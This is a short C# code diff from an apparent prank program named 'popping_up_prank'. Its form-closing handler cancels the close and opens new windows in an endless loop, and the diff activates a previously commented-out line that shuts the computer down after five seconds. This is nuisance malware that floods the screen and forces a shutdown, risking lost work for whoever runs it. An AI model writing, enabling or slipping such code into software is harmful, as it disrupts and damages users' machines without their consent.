@@ -43,7 +43,7 @@ namespace popping_up_prank
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             e.Cancel = true;
-            // Process.Start("shutdown", "/s /t 5");
+            Process.Start("shutdown", "/s /t 5");
             while (true)
                 new Form1().Show();
         }
